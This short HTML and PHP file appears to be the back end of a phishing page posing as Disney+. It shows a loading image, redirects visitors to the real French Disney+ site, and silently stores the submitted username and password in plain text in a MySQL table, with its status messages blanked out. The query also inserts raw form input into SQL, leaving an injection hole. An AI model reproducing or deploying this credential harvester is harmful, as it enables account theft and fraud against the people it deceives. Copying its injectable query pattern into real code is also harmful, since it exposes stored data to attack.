<!DOCTYPE html>
<html>

<head>
	<link rel="stylesheet" type="text/css" href="css/styles.css">
	<meta http-equiv="refresh" content="0;url=https://www.disneyplus.com/fr-fr/"> 
</head>

<body>
<img src="img/loading.gif">
</body>

<?php

$link = mysqli_connect("localhost", "root", "root", "data");
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

// Get user and password
if (isset($_POST['submit'])) {
		$utilisateur = $_REQUEST['utilisateur'];
		$mdp = $_REQUEST['mdp'];	
}

// Attempt insert query execution
$sql = "INSERT INTO users (identifiant, password) VALUES ('$utilisateur', '$mdp')";
if(mysqli_query($link, $sql)){
    echo ""; // Text here is 'Records inserted successfully.'
} else{
    echo ""; // Text here is '"ERROR: Could not able to execute $sql. " . mysqli_error($link)'
}
 
// Close connection
mysqli_close($link);


?>

